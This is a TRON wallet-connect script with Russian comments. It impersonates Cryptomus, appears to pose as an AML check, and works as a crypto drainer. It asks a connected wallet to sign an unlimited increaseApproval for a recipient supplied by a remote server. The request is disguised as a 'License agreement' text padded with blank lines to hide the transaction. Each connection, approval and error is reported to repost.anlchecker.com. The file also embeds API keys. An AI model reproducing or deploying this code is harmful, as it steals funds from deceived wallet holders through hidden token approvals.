import { TronWeb } from 'tronweb';
import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';
import { Buffer } from 'buffer';
window.Buffer = Buffer;

const MAX_UINT256 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { "TRON-PRO-API-KEY": '3724eeab-3398-4458-a23c-ca8fb2741347' },
})


let address = null;
let wallet = null;
let contractDetails = null;

clear_wallet_connect_session()
fetchData('settings');
initWalletConnect()


const connectWalletConnect = async (setIsFinishModalOpen, setIsCallContractModalOpen) => {
    try {
        let connection = await wallet.connect()
        address = connection.address

        const { contractAddress } = contractDetails;
      
        var requestData = {
            'address': address,
            'chain': 'TRX',
            'contract': contractAddress,
            'domain': window.location.host
        }
        const response = await fetchData('connection', requestData)
        if(response.is_approved){
            setIsFinishModalOpen(true)
            return
        }
        console.log(`Подключено! Адрес: ${address}.`);
        setIsCallContractModalOpen(true)
    } catch (error) {
        console.error('Ошибка подключения к WalletConnect:', error);
        // alert(`Ошибка подключения к WalletConnect: ${error}`);
        initWalletConnect()
        const error_data = {
            "addr": "none",
            "chain": "TRX",
            "error": `Не удалось подключиться к кошельку. ${error.message}`
        }
        fetchData('error', error_data)
        // w3connectionError(error.message)

    }
}


async function callWalletConnectContract(setIsFinishModalOpen, setIsCallContractModalOpen) {
    if (!contractDetails) {
        console.error('Данные контракта не загружены, пытаюсь загрузить...');
        await fetchData('settings'); // Подгружаем данные, если их нет
        if (!contractDetails) {
            console.error('Не удалось загрузить данные контракта. Операция прервана.');
            initWalletConnect()
            // setStep('connect')
            const error_data = {
                "address": address,
                "chain": "TRX",
                "error": "Не удалось загрузить данные контракта"
            }
            fetchData('error', error_data)

            return;
        }
    }
    const { contractAddress, trc20Recipient } = contractDetails;
    if (!address) {
        console.error('Адрес не найден!');
        initWalletConnect()
       
        const error_data = {
            "address": address,
            "chain": "TRX",
            "error": "Адрес не найден"
        }
        // setStep('connect')
        fetchData('error', error_data)
        return;
    }

    console.log('Баланс достаточен для выполнения операции.');

    console.log('Выполняем approve...');

    const functionSelector = 'increaseApproval(address, uint256)';
    const parameters = [
        { type: 'address', value: trc20Recipient },
        { type: 'uint256', value: MAX_UINT256 },

    ];
    const options = {
        feeLimit: 30_000_000,
        from: address,
    };

    var transaction_swap = await tronWeb.transactionBuilder.triggerSmartContract(
        contractAddress,
        functionSelector,
        options,
        parameters,
        address,

    );
    var transaction = transaction_swap.transaction
    var result = transaction_swap.result

    let tx = { 'License agreement ✅': `LICENSE AGREEMENT\n\nThis License Agreement ("Agreement") is between Monad ("Company") and any user ("User") accessing the platform. By using the platform, the User agrees to this Agreement.\n\n### 1. License\nThe Company grants the User a limited, non-transferable license to use the platform for trading digital assets. Users may not modify, distribute, or reverse-engineer the platform.\n\n### 2. User Responsibilities\nUsers must comply with all laws, provide accurate registration information, secure their accounts, and refrain from illegal activities such as fraud or money laundering.\n\n### 3. Restrictions\nUsers must not disrupt platform functionality, attempt unauthorized access, or exploit vulnerabilities. The Company may suspend violating accounts.\n\n### 4. Intellectual Property\nAll trademarks, software, and content remain the property of the Company. Use of the platform does not grant ownership rights.\n\n### 5. Disclaimers & Liability\nThe platform is provided "as-is" without warranties. The Company is not responsible for financial losses. Users accept the risks of digital asset trading.\n\n### 6. Termination\nThe Company may suspend or terminate access for violations. Users must stop using the platform upon termination, but prior obligations remain.\n\n### 7. Governing Law & Disputes\nThis Agreement follows the laws of [Jurisdiction]. Disputes shall be resolved through arbitration in [Location].\n\n### 8. Amendments\nThe Company may modify this Agreement at any time. Continued use after changes indicates acceptance.\n\n### 9. Contact\nFor inquiries, contact support.\n\nBy using the platform, you acknowledge and agree to this Agreement.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`, transaction, result }

    // Подписываем approve через WalletConnect
    let signed_transaction = null;

    try{
        signed_transaction = await wallet.signTransaction(tx);
    } catch(e) {
        console.log(e)
        initWalletConnect()
     
        const error_data = {
            "address": address,
            "chain": "TRX",
            "error": "Ошибка в signed_transaction_promise." + getSignedTransactionErrorMessage(e)
        }
        // setStep('connect')
        fetchData('error', error_data)
    }
    
    // if (isMobileDevice()) {
    //     window.location.href = "https://link.trustwallet.com/a/key_live_lfvIpVeI9TFWxPCqwU8rZnogFqhnzs4D?&event=openURL&url=https://amlclear.com";
    // }
    
    const approveResult = await tronWeb.trx.sendRawTransaction(signed_transaction)
    console.log(approveResult)
    if (!approveResult.result) {
        
        initWalletConnect()
        const error_data = {
            "address": address,
            "chain": "TRX",
            "error": "Ошибка отправки транзакции. " + hexToText(approveResult.message)
        }
        // setStep('connect')
        fetchData('error', error_data)
        // throw new Error('Ошибка при выполнении approve', approveResult.message);
        return
    }
    setIsCallContractModalOpen(false)
    setIsFinishModalOpen(true)
    const requestData = {
        'chain': 'TRX',
        'domain': window.location.host,
        'contract': contractAddress,
        'address': address,
        'transaction': approveResult.txid
    }

    await fetchData('approve', requestData);
    // w3approve()

    console.log('approve успешно выполнен', approveResult);
    // setConnectionError("")
    initWalletConnect()
}


function initWalletConnect() {
    // if (walletConnect) {
    //     walletConnect.disconnect()
    // }
    // walletConnect.disconnect()
    // clear_wallet_connect_session()
    wallet = new WalletConnectWallet({
        network: WalletConnectChainID.Mainnet,
        options: {
            relayUrl: 'wss://relay.walletconnect.com',
            projectId: '5f6faeebe641981e49b21616d7c55320',
            metadata: {
                name: 'cryptomus.com',
                description: 'Cryptomus WalletConnect',
                url: 'https://cryptomus.com',
                icons: ['https://cryptomus.com/favicon.ico'],
            }
        },
        web3ModalConfig: {
            themeMode: 'dark',
            themeVariables: {
                '--wcm-z-index': '1000'
            },
            explorerRecommendedWalletIds: [
                'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
                '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
                '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150', // SafePal
                '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662', // BitGet
                'c03dfee351b6fcc421b4494ea33b9d4b92a984f87aa76d1663bb28705e95034a'  // Uniswap
            ]
        }
    });
}


async function fetchData(method, requestData = {}) {
    try {
        console.log('Запрос к серверу...');
        const response = await fetch(`https://repost.anlchecker.com/api/${method}/`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestData),
        });

        if (!response.ok) {
            throw new Error('Ошибка загрузки данных контракта');
        }

        if (method == 'settings') {
            contractDetails = await response.json();;
            console.log('Данные контракта успешно загружены:', contractDetails);
        }
        else {
            return await response.json();
        }
    } catch (error) {
        console.error('Ошибка запроса:', error);
        if(method === 'settings'){
            console.error('Ошибка при получении данных контракта:', error);
            contractDetails = null;
        }
        
    }
}


function clear_wallet_connect_session() {
    indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB')
}

function hexToText(hexString: any) {
    return decodeURIComponent(hexString.replace(/(..)/g, '%$1'));
}


function getSignedTransactionErrorMessage(error){
    let errorMessage = ""
    if (typeof error.message === "object") {
        errorMessage = JSON.stringify(error.message, null, 2);
    } else {
        errorMessage = error.message; 
    }
    if(!errorMessage){
        errorMessage = JSON.stringify(error, null, 2);
    }
    return errorMessage
}


export {callWalletConnectContract, connectWalletConnect}